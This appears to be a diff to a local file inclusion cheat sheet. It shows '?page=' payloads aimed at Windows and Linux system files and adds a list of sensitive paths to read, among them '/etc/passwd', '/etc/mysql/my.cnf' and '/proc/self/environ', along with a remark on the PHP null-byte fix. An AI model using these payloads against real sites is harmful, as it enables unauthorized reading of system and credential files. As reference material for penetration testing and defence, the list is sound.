@@ -1,6 +1,13 @@
 ?page=C:/Windows/system.ini ( Windows )
 ?page=/etc/passwd ( Linux )
-     =/etc/issue (ver)
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/issue
+/etc/mysql/my.cnf
+/proc/self/environ
+/proc/version
+/proc/cmdline
 ============================================
 Nullbyte fixed in 5.3.8
 ===============================
